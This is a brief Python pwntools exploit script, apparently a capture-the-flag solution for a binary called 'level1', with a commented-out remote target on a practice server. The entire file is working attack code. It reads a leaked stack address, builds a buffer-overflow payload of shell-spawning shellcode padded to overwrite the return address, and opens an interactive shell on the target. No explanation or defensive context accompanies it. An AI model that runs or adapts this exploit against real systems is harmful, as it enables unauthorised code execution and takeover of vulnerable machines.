from pwn import *
context(log_level='debug')
io = process("./level1")
#io = remote("node4.buuoj.cn",29905)
buf_addr = int(io.recv()[-12:-2],16)
payload = asm(shellcraft.sh())
payload +=(0x88+4-len(asm(shellcraft.sh())))*'a' + p32(buf_addr)
print hex(buf_addr)
io.sendline(payload)
io.interactive()